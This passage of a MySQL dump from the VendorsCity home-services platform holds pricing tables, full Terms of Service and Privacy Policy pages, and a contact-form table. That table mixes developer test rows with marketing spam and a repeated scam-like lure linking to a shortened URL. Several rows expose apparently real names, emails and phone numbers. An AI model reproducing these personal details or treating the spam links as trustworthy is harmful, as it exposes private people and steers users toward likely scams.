(91, 19, 93, 'hitesh', 'p', NULL, '12', 'Dev Appartment', NULL, NULL, '22', NULL, '9033259413', 'devang.hnrtechnologies@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1', NULL),
(92, 19, 94, '', '', NULL, '', '', '', NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `cleanin_subserviceprice`
--

CREATE TABLE `cleanin_subserviceprice` (
  `id` int(11) NOT NULL,
  `subservice_id` int(11) NOT NULL,
  `per_person_price` int(11) NOT NULL,
  `hourly_price` int(11) NOT NULL,
  `cleaning_material_price_per_hour` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `cleanin_subserviceprice`
--

INSERT INTO `cleanin_subserviceprice` (`id`, `subservice_id`, `per_person_price`, `hourly_price`, `cleaning_material_price_per_hour`) VALUES
(1, 28, 78, 27, 10),
(2, 30, 78, 27, 10);

-- --------------------------------------------------------

--
-- Table structure for table `cms`
--

CREATE TABLE `cms` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` text COLLATE utf8mb4_unicode_ci,
  `meta_title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_keyword` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_description` text COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `cms`
--

INSERT INTO `cms` (`id`, `name`, `description`, `meta_title`, `meta_keyword`, `meta_description`, `created_at`, `updated_at`) VALUES
(1, 'Terms of Service', '<p>Welcome to VendorsCity!</p><p>VendorsCity.com is an aggregator platform for various services, collaborating with third-party vendors who are registered with the relevant licensing or regulatory authorities. Services can be booked through our website (“Website”) and are directly delivered by these Vendors (service providers) to the customers.</p><p>These terms and conditions (“Agreement”) outline the general terms and conditions of your use of the VendorsCity.com website (“Website”) and any related products and services (collectively, “Services”). This Agreement constitutes a legally binding contract between you (“User”, “you” or “your”) and VendorsCity Portal LLC (“VendorsCity Portal LLC”, “we”, “us” or “our”).</p><p>If you are entering into this Agreement on behalf of a business or other legal entity, you confirm that you have the authority to bind such an entity to this Agreement, and in such a case, the terms “User”, “you” or “your” shall refer to such entity. If you do not have such authority, or if you disagree with the terms of this Agreement, you must not accept this Agreement and may not access or use the Services.</p><p>By accessing and using the Services, you confirm that you have read, understood, and agree to be bound by the terms of this Agreement. You acknowledge that this Agreement is a contract between you and VendorsCity Portal LLC, even though it is electronic and is not physically signed by you, and it governs your use of the Services.</p><p><strong>Use of Services</strong></p><p>You agree to use the Services only for purposes that are permitted by this Agreement and any applicable law, regulation, or generally accepted practices or guidelines in the relevant jurisdictions. You must not use the Services for any unlawful or fraudulent purposes.</p><p><strong>User Responsibilities</strong></p><p>You are responsible for maintaining the confidentiality of your account login information and for all activities that occur under your account. You agree to immediately notify VendorsCity Portal LLC of any unauthorized use of your account or password or any other breach of security.</p><p><strong>Vendors</strong> (Service Providers)</p><p>The services offered on the VendorsCity platform are provided by third-party service providers. VendorsCity Portal LLC does not directly provide the services but acts as a facilitator between you and the service providers. Therefore, VendorsCity Portal LLC is not liable for the actions or inactions of the service providers.</p><p><strong>Bookings and Payments</strong></p><p>By making a booking through the Website, you agree to the terms and conditions of the service provider, including any cancellation policies. Payments for services are processed through secure third-party payment gateways. VendorsCity Portal LLC does not store your payment information.</p><p><strong>Limitation of Liability</strong></p><p>To the fullest extent permitted by law, VendorsCity Portal LLC shall not be liable for any indirect, incidental, special, consequential, or punitive damages, or any loss of profits or revenues, whether incurred directly or indirectly, or any loss of data, use, goodwill, or other intangible losses, resulting from your use of the Services.</p><p><strong>Accounts and Membership</strong></p><p>When you create an account with the Services, you are responsible for maintaining its security and are fully accountable for all activities and actions that occur under your account. Although we may monitor and review new accounts before they are activated, we are not obligated to do so. Providing false contact information may result in the termination of your account. You must promptly notify us of any unauthorized use of your account or any security breaches. We are not liable for any acts or omissions by you, including any damages resulting from such acts or omissions. We reserve the right to suspend, disable, or delete your account if we determine that you have violated any part of this Agreement or if your conduct damages our reputation or goodwill. If your account is terminated for these reasons, you may not re-register for our Services, and we may block your email and IP address to prevent further registration.</p><p><strong>User Content</strong></p><p>We do not claim ownership of any data, information, or material (collectively, “Content”) that you submit to the Services while using them. You are solely responsible for the accuracy, quality, integrity, legality, reliability, appropriateness, and intellectual property rights of all submitted Content. We may monitor and review Content submitted or created using our Services. You grant us permission to access, copy, distribute, store, transmit, reformat, display, and perform the Content of your account solely to provide the Services to you. We reserve the right, at our discretion, to refuse or remove any Content that we believe violates our policies or is harmful or objectionable. You also grant us a license to use, reproduce, adapt, modify, publish, or distribute Content created by you for commercial, marketing, or similar purposes.</p><p><strong>Billing and Payments</strong></p><p>You agree to pay all fees or charges to your account in accordance with the fees, charges, and billing terms effective at the time the fee or charge is due and payable. Sensitive and private data exchange occurs over SSL-secured communication channels and is encrypted and protected with digital signatures. The Services comply with PCI vulnerability standards to create a secure environment for Users. We perform regular malware scans for additional security. We reserve the right to change product pricing at any time and to refuse any order you place. We may limit or cancel quantities purchased per person, per household, or per order at our discretion. If we make changes to or cancel an order, we may notify you using the email and/or billing address/phone number provided when the order was made.</p><p><strong>Accuracy of Information</strong></p><p>Occasionally, the Services may contain typographical errors, inaccuracies, or omissions related to product descriptions, pricing, availability, promotions, and offers. We reserve the right to correct any errors, inaccuracies, or omissions, and to change or update information or cancel orders if any information on the Services is inaccurate at any time without prior notice (including after you have submitted your order). We undertake no obligation to update, amend, or clarify information on the Services, including pricing information, except as required by law. No specified update or refresh date applied on the Services should be taken to indicate that all information on the Services has been modified or updated.</p><p><strong>Third-Party Services</strong></p><p>If you enable, access, or use third-party services (such as for authentication), you acknowledge that your access and use of such services are governed solely by the terms and conditions of those services. We do not endorse, are not responsible for, and make no representations regarding any aspect of such third-party services, including their content or the manner in which they handle data. You irrevocably waive any claim against VendorsCity Portal LLC with respect to such third-party services. VendorsCity Portal LLC is not liable for any damage or loss caused by or in connection with your enablement, access, or use of any such services or your reliance on their privacy practices, data security processes, or other policies. You may need to register or log into such services on their respective platforms. By enabling any third-party services, you expressly permit VendorsCity Portal LLC to disclose your data as necessary to facilitate the use or enablement of such services.</p><p><strong>Backups</strong></p><p>We perform regular backups of the Website and its Content to ensure completeness and accuracy. In the event of hardware failure or data loss, we will restore backups automatically to minimize impact and downtime.</p><p><strong>Links to Other Resources</strong></p><p>The Services may link to other resources (such as websites and mobile applications). These links do not imply approval, association, sponsorship, endorsement, or affiliation with any linked resource unless specifically stated. We are not responsible for examining or evaluating, and we do not warrant the offerings of any businesses or individuals or the content of their resources. We do not assume any responsibility or liability for the actions, products, services, or content of any other third parties. You should carefully review the legal statements and other conditions of use of any resource you access through a link on the Services. Your linking to any other off-site resources is at your own risk.</p><p><strong>Referral to Third-Party Services Providers</strong></p><p>By using our website or application, you agree that we may connect you or refer you to third-party Home Services Providers that specialize in delivering your requested service. In such cases, we act as an intermediary between you and the third-party provider. The Service Provider remains an independent contractor with respect to the performance of the Services. Nothing in this Agreement shall be construed to create an association, trust, partnership, joint venture, or other business entity, or impose any trust or partnership or similar duty on us or the Service Provider.</p><p><strong>Prohibited Uses</strong></p><p>In addition to other terms set forth in the Agreement, you are prohibited from using the Services or Content for any unlawful purpose, to solicit others to perform or participate in unlawful acts, to violate any regulations or laws, to infringe upon our intellectual property rights or the rights of others, to harass, abuse, insult, harm, defame, slander, disparage, intimidate, or discriminate based on various protected characteristics, to submit false or misleading information, to upload or transmit viruses or malicious code, to spam or engage in fraudulent activities, for obscene or immoral purposes, or to interfere with the security features of the Services. We reserve the right to terminate your use of the Services for violating any of these prohibited uses.</p><p><strong>Sanctions Compliance</strong></p><p>The Website will NOT deal with or provide services or products to any OFAC (Office of Foreign Assets Control) sanctioned countries in accordance with UAE law.</p><p><strong>Intellectual Property Rights</strong></p><p>“Intellectual Property Rights” includes all present and future rights conferred by statute, common law, or equity in relation to any copyright and related rights, trademarks, designs, patents, inventions, goodwill, rights to sue for passing off, rights to inventions, and all other intellectual property rights, whether registered or unregistered. This Agreement does not transfer any intellectual property owned by VendorsCity Portal LLC or third parties to you, and all rights, titles, and interests in such property will remain solely with VendorsCity Portal LLC. All trademarks, service marks, graphics, and logos used in connection with the Services are trademarks or registered trademarks of VendorsCity Portal LLC or its licensors. Other trademarks used in connection with the Services may be the trademarks of third parties. Your use of the Services does not grant you any right or license to reproduce or use any VendorsCity Portal LLC or third-party trademarks.</p><p><strong>Disclaimer of Warranty</strong></p><p>The Services are provided \"as is\" and \"as available,\" and your use of the Services is at your own risk. We expressly disclaim all warranties of any kind, whether express or implied, including but not limited to implied warranties of merchantability, fitness for a particular purpose, and non-infringement. We make no warranty that the Services will meet your requirements, be uninterrupted, timely, secure, or error-free; nor do we make any warranty regarding the results obtained from using the Services or the accuracy or reliability of any information obtained through the Services. You understand and agree that any material and/or data downloaded or otherwise obtained through the use of the Services is done at your own discretion and risk, and you will be solely responsible for any damage or loss of data resulting from the download of such material and/or data. We make no warranty regarding any goods or services purchased or obtained through the Services or any transactions entered into through the Services unless otherwise stated. No advice or information, whether oral or written, obtained by you from us or through the Services shall create any warranty not expressly stated herein.</p><p><strong>Limitation of Liability</strong></p><p>To the fullest extent permitted by applicable law, VendorsCity Portal LLC, its affiliates, directors, officers, employees, agents, suppliers, or licensors shall not be liable for any indirect, incidental, special, punitive, cover, or consequential damages (including, without limitation, damages for lost profits, revenue, sales, goodwill, use of content, impact on business, business interruption, loss of anticipated savings, or loss of business opportunity) however caused, under any theory of liability, including but not limited to contract, tort, warranty, breach of statutory duty, negligence, or otherwise, even if the liable party has been advised of the possibility of such damages or could have foreseen such damages. To the maximum extent permitted by applicable law, the aggregate liability of VendorsCity Portal LLC and its affiliates, officers, employees, agents, suppliers, and licensors relating to the Services will be limited to an amount greater of one dollar or any amounts actually paid in cash by you to VendorsCity Portal LLC for the prior one month period before the first event or occurrence giving rise to such liability. The limitations and exclusions also apply if this remedy does not fully compensate you for any losses or fails its essential purpose.</p><p><strong>Indemnification</strong></p><p>You agree to indemnify and hold VendorsCity Portal LLC and its affiliates, directors, officers, employees, agents, suppliers, and licensors harmless from and against any liabilities, losses, damages, or costs, including reasonable attorneys’ fees, incurred in connection with or arising from any third-party allegations, claims, actions, disputes, or demands asserted against any of them as a result of or relating to your Content, your use of the Services, or any willful misconduct on your part.</p><p><strong>Severability</strong></p><p>All rights and restrictions contained in this Agreement may be exercised and shall be applicable and binding only to the extent that they do not violate any applicable laws and are intended to be limited to the extent necessary so that they will not render this Agreement illegal, invalid, or unenforceable. If any provision or portion of any provision of this Agreement shall be held to be illegal, invalid, or unenforceable by a court of competent jurisdiction, it is the intention of the parties that the remaining provisions or portions thereof shall constitute their agreement with respect to the subject matter hereof, and all such remaining provisions or portions thereof shall remain in full force and effect.</p><p><strong>Dispute Resolution</strong></p><p>The formation, interpretation, and performance of this Agreement and any disputes arising out of it shall be governed by the substantive and procedural laws of the United Arab Emirates without regard to its rules on conflicts or choice of law and, to the extent applicable, the laws of the United Arab Emirates. The exclusive jurisdiction and venue for actions related to the subject matter hereof shall be the courts located in the United Arab Emirates, and you hereby submit to the personal jurisdiction of such courts. You hereby waive any right to a jury trial in any proceeding arising out of or related to this Agreement. The United Nations Convention on Contracts for the International Sale of Goods does not apply to this Agreement.</p><p><strong>Changes and Amendments</strong></p><p>We reserve the right to modify this Agreement or its terms relating to the Services at any time, effective upon posting an updated version of this Agreement on the Services. When we do, we will revise the updated date at the bottom of this page. Continued use of the Services after any such changes shall constitute your consent to such changes.</p><p><strong>Refund/Return Policy</strong></p><p>Refunds will only be processed through the original mode of payment.</p><p><strong>Quality Assurance Program /Quality Control Policy</strong></p><p>We conduct regular random quality inspections to ensure the high standards of our crew members\' work while they are on duty. Our quality checks include three methods:</p><p><strong>Unannounced Visits:&nbsp;</strong>To verify that service professionals are properly uniformed and performing their duties thoroughly and completely.</p><p><strong>On-Site Inspections:</strong> A walk-through with the service professional and/or the client during regular business hours.</p><p><strong>Follow-Up:&nbsp;</strong>A brief telephone call by our customer service agents after your session has been completed.</p><p><strong>Reporting Issues</strong></p><p>You can report the following issues within the specified timeframes:</p><p><strong>Missing/Stolen Items:&nbsp;</strong>Within 48 hours.</p><p><strong>Damaged Items:&nbsp;</strong>Within 24 hours</p><p><strong>Acceptance of These Terms</strong></p><p>You acknowledge that you have read this Agreement and agree to all its terms and conditions. By using the Services, you agree to be bound by this Agreement. If you do not agree to abide by the terms of this Agreement, you are not authorized to use or access the Services.</p><p><strong>Governing Law</strong></p><p>This Agreement and any disputes related to it shall be governed by and construed in accordance with the laws of the United Arab Emirates, without regard to its conflict of law principles.</p><p><strong>Contacting Us</strong></p><p>If you have any questions about this Agreement, please contact us at&nbsp;<a href=\"mailto:support@vendorscity.com\">support@vendorscity.com</a></p>', NULL, NULL, NULL, '2023-11-10 05:39:01', '2024-05-23 07:18:51'),
(2, 'Privacy Policy', '<p>Welcome to VendorsCity. We are committed to protecting your personal information and your right to privacy. If you have any questions or concerns about this privacy notice or our practices with regard to your personal information, please contact us at&nbsp;<a href=\"mailto:support@vendorscity.com\">support@vendorscity.com</a>.</p><p>This Privacy Policy outlines how we collect, use, and share your information when you utilize our Service. It also informs you of your privacy rights and the legal protections available to you.</p><p>We utilize your personal data to deliver and enhance our Service. By using the Service, you consent to the collection and use of your information as detailed in this Privacy Policy.</p><p><strong>1. Information We Collect</strong></p><p>We may collect, store, and use the following types of personal information:</p><ul><li>Information about your computer and your visits to this website (including your IP address, geographic location, browser type and version, operating system, referral source, visit length, page views, and website navigation paths);</li><li>Information related to any transactions carried out between you and us on or through this website, including data about any purchases you make of our services;</li><li>Information that you provide to us when registering with our website (including your name, address, and email address);</li><li>Information that you provide to us for subscribing to our services, email notifications, and newsletters (including your name and email address);</li><li>Any other information that you choose to send to us.</li><li>Before you disclose personal information about another person to us, you must obtain that person’s consent to both the disclosure and the processing of that personal information in accordance with this privacy policy.</li></ul><p><strong>2. Cookies</strong></p><p>Our website uses cookies to enhance your browsing experience. Cookies are small files stored on your computer by your web browser. We use both session cookies (deleted when you close your browser) and persistent cookies (remain on your computer until deleted) to improve website functionality and security.</p><p>We use session cookies to keep track of you while you navigate the website, keep track of your bookings, prevent fraud, and increase website security. Persistent cookies are used to enable our website to recognize you when you visit, keep track of your preferences in relation to your use of our website, and other uses.</p><p>We use Google Analytics to analyze the use of our website. Google Analytics generates statistical and other information about website use by means of cookies, which are stored on users\' computers. The information generated relating to our website is used to create reports about the use of the website. Google will store this information. Google\'s privacy policy is available at:&nbsp;<a href=\"http://www.google.com/privacypolicy.html\">http://www.google.com/privacypolicy.html</a>&nbsp;</p><p><strong>3. Using Your Personal Information</strong></p><p>Personal information submitted to us via this website will be used for the purposes specified in this privacy policy or on the relevant pages of the website. We may use your personal information to:</p><p>Administer the website;</p><ul><li>Improve your browsing experience by personalizing the website;</li><li>Enable your use of the services available on the website;</li><li>Supply services purchased via the website;</li><li>Send statements and invoices to you, and collect payments from you;</li><li>Send you non-marketing commercial communications;</li><li>Send you email notifications you have specifically requested;</li><li>Send you our newsletter and other marketing communications relating to our business, which we think may be of interest to you, by post or, where you have specifically agreed to this, by email or similar technology (you can inform us at any time if you no longer require marketing communications);</li><li>Deal with enquiries and complaints made by or about you relating to the website;</li><li>Keep the website secure and prevent fraud;</li><li>Verify compliance with the terms and conditions governing the use of the website.</li></ul><p>When you submit personal information for publication on our website, we will publish and otherwise use that information in accordance with the license you grant to us. Without your express consent, we will not provide your personal information to any third parties for direct marketing.</p><p><strong>4. Disclosures</strong></p><p>We may disclose your personal information to any of our employees, officers, insurers, professional advisers, agents, suppliers, or subcontractors as reasonably necessary for the purposes set out in this privacy policy. We may also disclose your personal information to any member of our group of companies (this means our subsidiaries, our ultimate holding company, and all its subsidiaries) as reasonably necessary for the purposes set out in this privacy policy.</p><p>Additionally, we may disclose your personal information:</p><ul><li>To the extent that we are required to do so by law;</li><li>In connection with any ongoing or prospective legal proceedings;</li><li>In order to establish, exercise, or defend our legal rights (including providing information to others for the purposes of fraud prevention and reducing credit risk);</li><li>To any person who we reasonably believe may apply to a court or other competent authority for disclosure of that personal information where, in our reasonable opinion, such court or authority would be reasonably likely to order disclosure of that personal information.</li><li>Except as provided in this privacy policy, we will not provide your personal information to third parties.</li></ul><p><strong>5. International Data Transfers</strong></p><p>Information that we collect may be stored and processed in and transferred between any of the countries in which we operate in order to enable us to use the information in accordance with this privacy policy. Personal information that you submit for publication on the website may be published on the internet and may be available, via the internet, around the world. We cannot prevent the use or misuse of such information by others.</p><p>You expressly agree to such transfers of personal information.</p><p><strong>6. Security of Your Personal Information</strong></p><p>We will take reasonable technical and organizational precautions to prevent the loss, misuse, or alteration of your personal information. We will store all the personal information you provide on our secure (password- and firewall-protected) servers.</p><p>All electronic financial transactions entered into via the website will be protected by encryption technology.</p><p>You acknowledge that the transmission of information over the internet is inherently insecure, and we cannot guarantee the security of data sent over the internet. However, we take appropriate steps to ensure data privacy and security through various hardware and software methodologies.</p><p><strong>7. Policy Amendments</strong></p><p>We may update this privacy policy from time to time by posting a new version on our website. You should check this page occasionally to ensure you are happy with any changes. We may also notify you of changes to our privacy policy by email.</p><p><strong>8. Your Rights</strong></p><p>You may instruct us to provide you with any personal information we hold about you, subject to payment of a fee (currently fixed at AED 24) and the supply of appropriate evidence of your identity (for this purpose, we will usually accept a photocopy of your passport certified by a solicitor or bank plus an original copy of a utility bill showing your current address).</p><p>We may withhold such personal information to the extent permitted by law.</p><p>You may instruct us not to process your personal information for marketing purposes by sending an email to us at&nbsp;<a href=\"mailto:support@vendorscity.com\">support@vendorscity.com</a>.&nbsp; In practice, you will usually either expressly agree in advance to our use of your personal information for marketing purposes, or we will provide you with an opportunity to opt out of the use of your personal information for marketing purposes.</p><p><strong>9. Third Party Websites</strong></p><p>Our website may contain links to other websites. We are not responsible for the privacy policies or practices of third party websites.</p><p><strong>10. Updating Information</strong></p><p>Please let us know if the personal information that we hold about you needs to be corrected or updated.</p><p><strong>11. Data Collection</strong></p><p>We collect data such as your phone number, email address, home address, latitude, and longitude. This information is provided to us when you make a booking or request a quote. We need to contact you and locate you to provide home services. If you wish to have this data deleted, please send us an email at&nbsp;<a href=\"mailto:support@vendorscity.com\">support@vendorscity.com</a> requesting data deletion.</p><p>This privacy policy ensures that your personal data is handled securely and in compliance with applicable laws. If you have any questions or concerns, please contact us at&nbsp;<a href=\"mailto:support@vendorscity.com\">support@vendorscity.com</a>.</p>', NULL, NULL, NULL, '2023-11-10 05:42:01', '2024-05-23 07:29:45'),
(3, 'Payment  & Refund Policy', '<p>Comming Soon…</p>', NULL, NULL, NULL, '2024-06-07 05:37:57', '2024-06-07 05:37:57');

-- --------------------------------------------------------

--
-- Table structure for table `contact_us`
--

CREATE TABLE `contact_us` (
  `id` int(11) NOT NULL,
  `fname` varchar(255) DEFAULT NULL,
  `lname` varchar(255) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `mobile` varchar(255) DEFAULT NULL,
  `message` text
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `contact_us`
--

INSERT INTO `contact_us` (`id`, `fname`, `lname`, `email`, `mobile`, `message`) VALUES
(1, 'mayudin', 'chauhan', 'mayudin.hnrtechnologies@gmail.com', '7990739286', 'Teest'),
(2, 'test', 'test', 'mayudin.hnrtechnologies@gmail.com', '7990739286', 'test'),
(3, 'Abhshek P', 'Patdiya', 'abhishek.hnrtechnologies@gmail.com', '1234567890', 'test'),
(4, 'Abhishek', 'Patadiya', 'abhishek.hnrtechnologies@gmail.com', '1234567890', 'ttest'),
(5, 'AmeliaOblitty2', 'AmeliaOblitty2', 'Biaxmerieb@gmail.com', '83798295286', 'Hello, how about we share some sweet treats in bed? -  https://rb.gy/7xb976?bype'),
(6, 'mayudin', 'chauhan', 'mayudin.hnrtechnologies@gmail.com', '7897897899', 'test'),
(7, 'Abhi', 'Rana', 'efficientmanage007@outlook.com', '', 'Are you looking for a personal assistant who can handle your daily business operations and make your life easier? I can help with tasks related to admin, marketing, answering emails, website management, social media, content creation, planning new projects, bookkeeping, learning software, and back-office assistance. \r\n\r\nIf you are interested, send me an email at efficientmanage007@outlook.com with a list of tasks you want to accomplish, and I will take it from there.\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n'),
(8, 'Delora', 'Carroll', 'coursiify@kagrowth.org', '', 'Hi, \r\n\r\nThousands of opportunities on the internet but this supersedes them all.\r\n\r\nBecause E-learning is now a thing and platforms like Coursera are making it big here.\r\n\r\nDon\'t you desire to own platforms like Coursera, Udemy, and more?\r\n\r\n\r\nI would be s*lly if I asked you to start building from scratch because it\'s super expensive.\r\n\r\n\r\nMy friend Seyi has launched groundbreaking AI software that creates a unique and fully loaded E-Learning Platform For you: https://www.kagrowth.org/coursiify \r\n\r\nWith Coursiify,\r\n\r\nYou will get a fully packed E-Learning platform with just a Keyword.\r\nYou will never record a course or pay experts to\r\nYou will never hire a developer to build the platform for you\r\nYou don\'t have to pay anyone a dime to market it for you or even run ads.\r\n\r\nNot just that…\r\n\r\nOur Inbuilt marketplace is there to market, sell, and hand over profit to you.\r\n\r\nSounds amazing right?\r\n\r\nIf you get in today, be sure to get amazing Bonuses and discounts.\r\n\r\nGet Coursiify Here & Turn One Keyword To E-learning Platform In Seconds : https://www.kagrowth.org/coursiify \r\n\r\nSee you inside\r\nDelora Carroll\r\n\r\n\r\nP.S. Don\'t exit this page without getting on board, you will be missing out on the big opportunity to get into a top leading E-learning marketplace.   Hurry and get started.\r\n\r\n\r\n\r\nUNSUBSCRIBE: https://www.kagrowth.org/unsubscribe \r\nAddress: 3643 Washburn Street\r\nBaton Rouge, LA 70805'),
(9, 'Abhishek', 'Patadiya', 'abhishek.hnrtechnologies@gmail.com', '1234567890', 'test'),
(10, 'Abhishek', 'Patadiya', 'abhishek.hnrtechnologies@gmail.com', '1234567890', 'teset'),
(11, 'Emily', 'Jones', 'emilyjones2250@gmail.com', '', 'Hi there,\r\n\r\nWe run a YouTube growth service, which increases your number of subscribers both safely and practically. \r\n\r\n- We guarantee to gain you 700-1500+ subscribers per month.\r\n- People subscribe because they are interested in your channel/videos, increasing likes, comments and interaction.\r\n- All actions are made manually by our team. We do not use any \'bots\'.\r\n\r\nThe price is just $60 (USD) per month, and we can start immediately.\r\n\r\nIf you have any questions, let me know, and we can discuss further.\r\n\r\nKind Regards,\r\nEmily'),
(12, 'Judson', 'Macansh', 'macansh.judson@gmail.com', '', 'Hi there, my name is Cody Griner. I apologize for using your contact form, \r\nbut I wasn\'t sure who the right person was to speak with in your company. \r\nWe have a patented application that creates Local Area pages that rank on \r\ntop of Google within weeks, we call it Local Magic.  Here is a link to the \r\nproduct page https://www.mrmarketingres.com/local-magic/ . The product \r\nleverages technology where these pages are managed dynamically by AI and \r\nit is ideal for promoting contractors on Google.  Can I share a testimonial \r\nfrom one of our clients with you?  I can also do a short zoom to \r\nillustrate their full case study if you have time for it? \r\ncody@mrmarketingres.com 843-720-7301'),
(13, 'Diane', 'Blakemore', 'blakemore.diane@gmail.com', '', 'Hi there,\r\n\r\nI recently came across your website on vendorscity.com and found it very interesting. I was curious, have you ever considered creating an eBook out of your website content?\r\n\r\nThere are tools available, that allow you to easily convert website content into a well-designed eBook. This could be a great way to repurpose your existing content and potentially reach a new audience.\r\n\r\nOf course, I understand this might not be something you\'re interested in, but I just wanted to share the possibility!\r\n\r\nAnyway, here is the tool I had in mind. It\'s only $16.95 so worth checking out: \r\nhttps://furtherinfo.org/lgb7\r\n\r\nBest regards,\r\nDiane\r\n\r\nUnsubscribe: https://removeme.click/wp/unsubscribe.php?d=vendorscity.com'),
(14, 'AmeliaOblittyc', 'AmeliaOblittyc', 'Biaxmeriea@gmail.com', '85431899474', 'Hello, how about we share some sweet treats in bed? -  https://rb.gy/7xb976?bype'),
(15, 'Kym', 'Munden', 'aichildrens@moregold.xyz', '', 'Hello vendorscity.com,\r\n\r\nYou may have heard that children\'s books are big business.   But did you know just HOW big?\r\n\r\nThe industry is valued at a staggering $4 billion in the US alone!\r\n\r\nHere\'s another fact to consider: over 60% of children\'s books are now sold online.   That\'s a massive pool of potential customers, all searching for their next enchanting story.\r\n\r\nThat\'s where you come in:\r\n\r\nhttps://www.moregold.xyz/aichildrens \r\n\r\nNow, what if you could create high-quality children\'s books effortlessly and tap into this thriving market?   With the A.I. Children\'s Book Maker, you absolutely can!\r\n\r\nThis powerful web app uses cutting-edge AI to write and illustrate stunning children\'s books in mere minutes.   You don\'t need any experience in writing or drawing.   Simply guide the AI with your idea and watch as your story comes to life.\r\n\r\nWhat does this mean for you?   A unique product.   A booming market.   Minimal overhead costs.   And a golden opportunity to open up a lucrative new income stream.\r\n\r\nCheck it out right now during the launch special:\r\n\r\nhttps://www.moregold.xyz/aichildrens \r\n\r\nSeize this opportunity today with the A.I. Children\'s Book Maker.   Let\'s shape the future of children\'s literature together.\r\n\r\nTo your continued success,\r\n\r\nKym Munden\r\n\r\n\r\nUNSUBSCRIBE: https://www.moregold.xyz/unsubscribe \r\nAddress: 2287 Snyder Avenue\r\nCharlotte, NC 28202'),
(16, 'Malissa', 'Soper', 'malissa.soper@gmail.com', '', 'vendorscity.com Administrator, Greetings. I\'ve just found your site, quick inquiry…\r\n\r\nMy name is Malissa, I located vendorscity.com after conducting a quick searching – you popped up near the top of the search rankings, so whatever you’re working on for SEO, seems like it’s operating well.\r\n\r\nSo here’s my question – what occurs AFTER someone arrives on your website? Anything at all?\r\n\r\nData tells us at least 70% of the people who locate your website, post a quick look-over, they leave… permanently.\r\n\r\nThat implies that all of the the work and effort you put into making them to appear, goes down the tubes.\r\n\r\nWhy in the world would you want all of that excellent work – and the great website you’ve created – go waste?\r\n\r\nAs the odds are they’ll just skip over calling or even pulling out their mobile phone, leaving in the lurch.\r\n\r\nBut, here’s a thought for you… what if you could make extremely simple for someone raise hand, “okay, let’s talk” without needing them to even pull out their phone from their pocket, thanks to revolutionary new software that can literally that first call happen NOW.\r\n\r\nWeb Visitors Into Leads is a software widget that sits on your site and waiting capture visitor’s Name, Email address and Phone Number. It lets know – so that you can talk that lead they’re still at your site, strike the iron’s!\r\n\r\nCLICK HERE https://advanceleadgeneration.com to try out a Live Demo with Web Visitors Into Leads now see exactly how it works targeting leads, you HAVE to act fast – the difference contacting within minutes 30 minutes later is huge 100 times better!\r\n\r\nThat’s why you should check our new SMS Text With Lead feature… once you’ve captured the phone number of the website, you can automatically off a text with them.\r\n\r\nImagine how powerful could be – even if they don’t take you up on your offer, you can stay in touch with them using text messages make new offers, provide links great, and build credibility this alone be a game changer to make your website more effective when the iron’s hot!\r\n\r\nCLICK HERE https://advanceleadgeneration.com to learn about everything Web Visitors Into Leads can do for your business be amazed and keep up the great work!\r\n\r\nMalissa\r\nPS: Web Visitors Into Leads offers a FREE 14 days – you could converting to 100x more leads immediately! It even includes Long Distance Calling, stop wasting money chasing that don’t turn into paying. CLICK HERE https://advanceleadgeneration.com to try Visitors Into Leads.\r\n\r\nNow, if you\'d like to unsubscribe click here https://advanceleadgeneration.com/unsubscribe.aspx?d=vendorscity.com\r\n\r\nJust quick note - the names and email used here, are placeholders real contact. We value and wanted make you’re aware you wish get touch the real person behind this message visit website we’ll connect you with the right individual\r\n'),
(17, 'Mike Turner\r\n', 'Mike Turner\r\n', 'mikeSnuntee@gmail.com', '86715531463', 'Greetings \r\n \r\nThis is Mike Turner\r\n \r\nLet me show you our latest research results from our constant SEO feedbacks that we have from our plans: \r\n \r\nhttps://www.strictlydigital.net/semrush-backlinks/ \r\n \r\nThe new Semrush Backlinks, which will make your vendorscity.com SEO trend have an immediate push. \r\nThe method is actually very simple, we are building links from domains that have a high number of keywords ranking for them.  \r\n \r\nForget about the SEO metrics or any other factors that so many tools try to teach you that is good. The most valuable link is the one that comes from a website that has a healthy trend and lots of ranking keywords. \r\nWe thought about that, so we have built this plan for you \r\n \r\nCheck in detail here: \r\nhttps://www.strictlydigital.net/semrush-backlinks/ \r\n \r\nCheap and effective \r\nTry it anytime soon \r\n \r\nRegards \r\nMike Turner\r\n \r\nhttps://www.strictlydigital.net/whatsapp-us/'),
(18, 'Georgina', 'Haynes', 'georginahaynes620@gmail.com', '', 'Hi,\r\n\r\nI just visited vendorscity.com and wondered if you\'d ever thought about having an engaging video to explain what you do?\r\n\r\nOur prices start from just $195.\r\n\r\nLet me know if you\'re interested in seeing samples of our previous work.\r\n\r\nRegards,\r\nGeorgina'),
(19, 'Harman', 'Singh', 'fastprocess006@outlook.com', '', 'Do you need any help with tasks related to Google sheets and Microsoft Excel? I can work on Creating Dashboards in excel sheets, Business Automation, Creating reports, graphs, fetching data from multiple sources, Data Spreadsheet formulations, Data Setup, Data Sorting, Vlookup, hlookup, pivot tables, manual entry of data in spreadsheet. \r\n\r\nPlease share your requirements with me on fastprocess006@outlook.com and I can share cost with you accordingly.\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n'),
